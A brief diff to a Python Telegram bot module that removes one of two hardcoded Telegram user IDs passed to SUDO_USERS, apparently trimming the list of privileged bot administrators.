@@ -4,7 +4,6 @@ from pyrogram.types import Message
 from lib.helpers.admins import get_administrators
 from lib.config import SUDO_USERS
 
-SUDO_USERS(2088106582)
 SUDO_USERS(1669508271)
 
 
